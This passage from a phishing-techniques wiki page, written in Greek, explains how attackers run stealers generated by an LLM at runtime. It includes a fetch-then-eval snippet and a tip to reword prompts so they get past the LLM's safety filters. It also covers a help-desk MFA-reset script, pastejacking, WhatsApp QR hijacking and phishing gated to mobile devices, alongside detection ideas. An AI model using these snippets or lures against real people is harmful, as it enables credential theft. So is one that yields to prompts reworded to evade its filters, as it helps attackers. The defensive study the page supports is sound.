Οι attackers μπορούν να στείλουν benign-looking HTML και να **παράγουν το stealer σε runtime** ζητώντας από ένα **trusted LLM API** JavaScript, και μετά εκτελώντας το in-browser (π.χ., `eval` ή dynamic `<script>`).

1. **Prompt-as-obfuscation:** κωδικοποίησε exfil URLs/Base64 strings στο prompt· άλλαζε διατύπωση για να παρακάμψεις safety filters και να μειώσεις hallucinations.
2. **Client-side API call:** στο load, το JS καλεί ένα public LLM (Gemini/DeepSeek/etc.) ή ένα CDN proxy· μόνο το prompt/API call υπάρχει στο static HTML.
3. **Assemble & exec:** συνέδεσε το response και εκτέλεσέ το (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** ο παραγόμενος code προσωποποιεί το lure (π.χ. LogoKit token parsing) και στέλνει creds στο prompt-hidden endpoint.

**Evasion traits**
- Η traffic χτυπά well-known LLM domains ή αξιόπιστα CDN proxies· μερικές φορές μέσω WebSockets σε backend.
- Δεν υπάρχει static payload· το malicious JS υπάρχει μόνο μετά το render.
- Μη ντετερμινιστικές generations παράγουν **unique** stealers ανά session.

**Detection ideas**
- Τρέξτε sandboxes με ενεργοποιημένο JS· επισημάνετε **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs προς LLM APIs αμέσως μετά από `eval`/`Function` σε returned text.
- Alert on unsanctioned LLM domains στο client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Παρακολουθήστε για συμβάντα AzureAD/AWS/Okta όπου τα **`deleteMFA` + `addMFA`** συμβαίνουν **μέσα σε λίγα λεπτά από το ίδιο IP**.



## Απαγωγή Προχείρου / Pastejacking

Οι επιτιθέμενοι μπορούν αθόρυβα να αντιγράψουν κακόβουλες εντολές στο clipboard του θύματος από μια παραβιασμένη ή typosquatted ιστοσελίδα και στη συνέχεια να το εξαπατήσουν ώστε να τις επικολλήσει μέσα σε **Win + R**, **Win + X** ή σε ένα παράθυρο terminal, εκτελώντας arbitrary code χωρίς κανένα download ή attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing για Mobile & Διανομή Κακόβουλων Apps (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Μια lure page (π.χ. ψεύτικο ministry/CERT “channel”) εμφανίζει ένα WhatsApp Web/Desktop QR και δίνει οδηγίες στο θύμα να το σαρώσει, προσθέτοντας αθόρυβα τον επιτιθέμενο ως **linked device**.
* Ο επιτιθέμενος αποκτά αμέσως ορατότητα σε chats/contacts μέχρι να αφαιρεθεί το session. Τα θύματα μπορεί αργότερα να δουν ειδοποίηση “new device linked”; οι defenders μπορούν να κάνουν hunt για απροσδόκητα device-link events λίγο μετά από επισκέψεις σε μη έμπιστα QR pages.

### Mobile‑gated phishing για αποφυγή crawlers/sandboxes
Οι operators όλο και περισσότερο βάζουν τα phishing flows τους πίσω από έναν απλό device check ώστε οι desktop crawlers να μην φτάνουν ποτέ στις τελικές σελίδες. Ένα συνηθισμένο pattern είναι ένα μικρό script που ελέγχει για ένα touch-capable DOM και στέλνει το αποτέλεσμα σε ένα server endpoint· οι non‑mobile clients λαμβάνουν HTTP 500 (ή μια κενή σελίδα), ενώ στους mobile users εμφανίζεται το πλήρες flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
Λογική του `detect_device.js` (απλοποιημένη):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Συμπεριφορά server που παρατηρείται συχνά:
- Ορίζει ένα session cookie κατά το πρώτο load.
- Δέχεται `POST /detect {"is_mobile":true|false}`.
- Επιστρέφει 500 (ή placeholder) στα επόμενα GET όταν `is_mobile=false`; σερβίρει phishing μόνο αν `true`.

Ευρετικές μέθοδοι hunting και detection:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: ακολουθία `GET /static/detect_device.js` → `POST /detect` → HTTP 500 για non‑mobile; τα legitimate mobile victim paths επιστρέφουν 200 με επόμενο HTML/JS.
- Μπλοκάρετε ή εξετάστε προσεκτικά σελίδες που condition το content αποκλειστικά σε `ontouchstart` ή παρόμοιους device checks.

Συμβουλές άμυνας:
- Εκτελέστε crawlers με mobile‑like fingerprints και ενεργό JS για να αποκαλυφθεί gated content.
- Ενεργοποιήστε alert για ύποπτες 500 responses μετά από `POST /detect` σε newly registered domains.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
